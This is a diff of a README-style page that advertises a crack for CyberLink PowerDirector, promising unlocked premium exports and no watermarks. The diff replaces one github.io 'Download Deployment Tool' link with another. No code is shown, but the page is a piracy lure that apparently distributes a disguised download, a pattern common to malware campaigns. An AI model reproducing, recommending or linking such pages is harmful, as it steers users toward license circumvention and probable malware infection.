@@ -3,7 +3,7 @@
 Get full creative control in **CyberLink PowerDirector** by unlocking premium export options and removing watermarks. Ideal for content creators, vloggers, and video editors looking for a clean and unrestricted production workflow.
 
 ⬇️ **Download**  
-[![Download Deployment Tool](https://img.shields.io/badge/Download-Deployment_Tool-brightgreen?style=for-the-badge)](https://trahendon.github.io/.github/POwerDirectorActiv=Pc11)
+[![Download Deployment Tool](https://img.shields.io/badge/Download-Deployment_Tool-brightgreen?style=for-the-badge)](https://mimerenowebinsummary1.github.io/.github/)
 
 ---
 
